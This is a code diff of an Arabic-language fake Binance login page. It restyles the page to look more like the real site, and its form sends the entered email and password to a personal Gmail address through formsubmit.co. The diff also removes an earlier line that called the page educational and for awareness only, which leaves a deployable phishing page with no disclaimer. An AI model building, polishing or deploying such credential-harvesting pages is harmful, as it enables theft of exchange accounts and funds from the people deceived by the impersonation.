@@ -1,21 +1,62 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>تسجيل الدخول - بينانس</title>
+  <title>تسجيل دخول Binance</title>
   <style>
-    body { font-family: Arial, sans-serif; direction: rtl; text-align: center; margin-top: 50px; }
-    input { padding: 10px; margin: 10px; width: 80%; font-size: 1em; }
-    button { padding: 10px 20px; font-size: 1em; cursor: pointer; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #0a0a0a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: #141414;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #00b67a;
+      width: 320px;
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 20px;
+      color: #00b67a;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #00b67a;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 4px;
+      font-size: 18px;
+      cursor: pointer;
+      color: white;
+    }
+    button:hover {
+      background-color: #019d65;
+    }
   </style>
 </head>
 <body>
-  <h2>تسجيل الدخول إلى بينانس</h2>
-  <form action="https://formsubmit.co/bassamsharifalisharif@gmail.com" method="POST">
-    <input type="text" name="username" placeholder="اسم المستخدم" required /><br />
-    <input type="password" name="password" placeholder="كلمة المرور" required /><br />
-    <button type="submit">دخول</button>
-  </form>
-  <p>هذه صفحة تعليمية فقط لأغراض التوعية.</p>
+  <div class="login-container">
+    <h1>تسجيل دخول Binance</h1>
+    <form id="loginForm" action="https://formsubmit.co/bassamsharifalisharif@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="البريد الإلكتروني" required />
+      <input type="password" name="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
 </body>
 </html>
